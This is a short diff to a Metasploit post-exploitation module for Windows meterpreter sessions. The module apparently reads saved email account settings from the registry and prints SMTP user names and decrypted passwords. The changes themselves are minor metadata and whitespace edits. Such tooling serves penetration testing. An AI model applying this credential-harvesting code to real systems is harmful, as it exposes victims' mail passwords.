@@ -11,7 +11,6 @@ require 'msf/core'
 require 'rex'
 require 'msf/core/post/windows/registry'
 require 'msf/core/post/windows/priv'
-require 'msf/core/auxiliary/report'
 
 class Metasploit3 < Msf::Post
 
@@ -32,8 +31,8 @@ class Metasploit3 < Msf::Post
 				},
 				'License'       => MSF_LICENSE,
 				'Author'        => [ 'Justin Cacak'],
-				'Version'       => '$Revision$',
-				'Platform'      => [ 'win' ],
+				'Version'       => '$Revision: 14835 $',
+				'Platform'      => [ 'windows' ],
 				'SessionTypes'  => [ 'meterpreter' ]
 			))
 	end
@@ -189,7 +188,7 @@ class Metasploit3 < Msf::Post
 						print_status("     Outgoing Mail Server (SMTP) User Name: #{smtp_user}")
 						print_status("     Outgoing Mail Server (SMTP) Password: #{smtp_decrypted_password}")
 					end
-
+								
 					smtp_use_ssl = get_valdata(k, 'SMTP Use SSL')
 					if smtp_use_ssl == nil
 						print_status("     SMTP Use SSL: No")
